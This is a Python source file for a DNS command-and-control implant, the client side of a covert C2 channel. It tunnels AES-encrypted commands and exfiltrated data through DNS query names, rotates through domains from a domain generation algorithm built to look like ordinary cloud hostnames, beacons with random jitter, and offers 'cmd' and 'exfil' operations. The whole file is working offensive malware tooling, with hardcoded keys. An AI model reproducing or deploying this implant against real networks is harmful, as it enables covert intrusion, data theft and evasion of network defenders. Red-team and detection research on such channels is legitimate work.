from dnslib import DNSRecord, QTYPE, A, TXT
import socket
import logging
import time
import random
import hashlib
import hmac
from datetime import datetime
from threading import Thread
from crypto import AESCipher

class DnsImplant:
    def __init__(self, server_ip="127.0.0.1", server_port=5353):
        self.server = (server_ip, server_port)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Crypto setup (same as server)
        self.cipher = AESCipher("master-key-!@#123")
        
        # Authentication
        self.client_id = "client-01"  # unique for each client
        self.auth_key = b"secret-auth-key-123!"  # unique for each client, pre-shared with server
        
        # Domain Generation Algorithm configuration (same as server)
        self.DGA_WORDS = ["api", "cdn", "mail", "storage", "cloud", 
                         "download", "assets", "content", "backup", "sync"]
        self.DGA_SEED = "my-strong-c2-key" #insert own key
        self.DGA_TLD = ".com"
        self.current_domains = []
        self.domain_index = 0
        self.last_dga_refresh = 0
        
        # Client state
        self.session_token = None
        self.sequence_num = 0
        self.running = False
        
        self._setup_logging()
        self._refresh_domains()  # Initial domain generation
        logging.info("Implant initialized with ID: %s", self.client_id)

    def _setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[logging.StreamHandler()]
        )
   
    # Client authentication
 
    def _generate_auth_signature(self, message):
        """Generate HMAC-SHA256 signature"""
        return hmac.new(
            self.auth_key,
            message.encode(),
            hashlib.sha256
        ).hexdigest()

    def _authenticate(self):
        """Perform handshake authentication"""
        try:
            # Client sends auth request
            nonce = str(random.getrandbits(128))
            auth_msg = f"{self.client_id}:{nonce}"
            signature = self._generate_auth_signature(auth_msg)
            
            # Encrypt and send
            payload = f"auth:{auth_msg}:{signature}"
            encrypted = self.cipher.encrypt(payload)
            domain = self._get_current_domain()
            query = f"auth.{encrypted}.{domain}"
            
            self._send_raw_query(query, QTYPE.A)
            
            # Verify server response
            response_data, _ = self.sock.recvfrom(1024)
            response = DNSRecord.parse(response_data)
            
            if response.rr and response.rr[0].rtype == QTYPE.A:
                ip = str(response.rr[0].rdata)
                if ip.startswith("192.168."):  # Special success IP
                    self.session_token = ip.split('.')[-1]
                    logging.info("Authentication successful")
                    return True
            
            logging.error("Authentication failed")
            return False
            
        except Exception as e:
            logging.error(f"Auth error: {e}")
            return False

  # Implementation of Domain Generation Algorithm
    
    def _generate_domains(self, count=50):
        """Generate domains matching server's DGA"""
        date_str = datetime.now().strftime("%Y%m%d")
        base = f"{self.DGA_SEED}{date_str}"
        domains = []
        
        for i in range(count):
            word = random.Random(i).choice(self.DGA_WORDS)
            h = hashlib.sha256(f"{base}{i}{word}".encode()).hexdigest()
            domains.append(f"{word}-{h[:4]}{self.DGA_TLD}")
        
        logging.debug(f"Generated {len(domains)} client domains")
        return domains

    def _refresh_domains(self):
        """Refresh DGA domains daily"""
        if time.time() - self.last_dga_refresh > 86400:
            self.current_domains = self._generate_domains()
            self.domain_index = 0
            self.last_dga_refresh = time.time()
            logging.info("Client domains refreshed")

    def _get_current_domain(self):
        """Get next domain in rotation"""
        self._refresh_domains()
        domain = self.current_domains[self.domain_index]
        self.domain_index = (self.domain_index + 1) % len(self.current_domains)
        return domain

  # Core communication begins
    def _send_raw_query(self, qname, qtype):
        """Low-level DNS query"""
        query = DNSRecord.question(qname, qtype)
        self.sock.sendto(query.pack(), self.server)

    def _send_command(self, command):
        """Send encrypted command with auth"""
        if not self.session_token and not self._authenticate():
            raise Exception("Not authenticated")
        
        # Format: <session>:<seq>:<cmd>
        payload = f"{self.session_token}:{self.sequence_num}:{command}"
        self.sequence_num += 1
        
        encrypted = self.cipher.encrypt(payload)
        domain = self._get_current_domain()
        query = f"cmd.{encrypted}.{domain}"
        
        self._send_raw_query(query, QTYPE.A)
        return self._wait_for_response()

    def _send_data(self, data):
        """Send encrypted data with auth"""
        if not self.session_token:
            raise Exception("Not authenticated")
        
        payload = f"{self.session_token}:{self.sequence_num}:{data}"
        self.sequence_num += 1
        
        encrypted = self.cipher.encrypt(payload)
        domain = self._get_current_domain()
        query = f"data.{encrypted}.{domain}"
        
        self._send_raw_query(query, QTYPE.TXT)
        return self._wait_for_response()

    def _wait_for_response(self, timeout=5):
        """Wait for server response"""
        start = time.time()
        while time.time() - start < timeout:
            try:
                response_data, _ = self.sock.recvfrom(1024)
                response = DNSRecord.parse(response_data)
                
                if response.rr:
                    if response.rr[0].rtype == QTYPE.A:
                        return str(response.rr[0].rdata)
                    elif response.rr[0].rtype == QTYPE.TXT:
                        return str(response.rr[0].rdata)
            except socket.timeout:
                continue
        return None

   # Client operations
  
    def start(self):
        """Start client with beaconing"""
        if not self._authenticate():
            logging.error("Initial authentication failed")
            return

        self.running = True
        Thread(target=self._beacon_loop, daemon=True).start()
        self._interactive_shell()

    def _beacon_loop(self):
        """Regular check-ins with C2"""
        while self.running:
            try:
                # Send heartbeat
                response = self._send_command("heartbeat")
                logging.debug(f"Heartbeat response: {response}")
                
                # Insert a random delay (30-90s)
                time.sleep(30 + random.random() * 60)
                
            except Exception as e:
                logging.error(f"Beacon error: {e}")
                time.sleep(60)
                # Re-authenticate on failure
                self._authenticate()

    def _interactive_shell(self):
        """Command interface for testing"""
        print("\nDNS C2 Client - Interactive Mode")
        print("Commands: exit, cmd <command>, exfil <data>")
        
        while self.running:
            try:
                user_input = input("> ").strip()
                if not user_input:
                    continue
                    
                if user_input.lower() == 'exit':
                    self.running = False
                    break
                    
                elif user_input.startswith('cmd '):
                    command = user_input[4:]
                    response = self._send_command(command)
                    print(f"Response: {response}")
                    
                elif user_input.startswith('exfil '):
                    data = user_input[6:]
                    response = self._send_data(data)
                    print(f"Server ACK: {response}")
                    
                else:
                    print("Unknown command")
                    
            except KeyboardInterrupt:
                self.running = False
            except Exception as e:
                print(f"Error: {e}")

if __name__ == "__main__":
    try:
        # Example: python3 dnsclient.py 192.168.1.100 5353
        import sys
        server_ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
        server_port = int(sys.argv[2]) if len(sys.argv) > 2 else 5353
        
        client = DnsImplant(server_ip, server_port)
        client.start()
        
    except Exception as e:
        logging.error(f"Client failed: {e}")
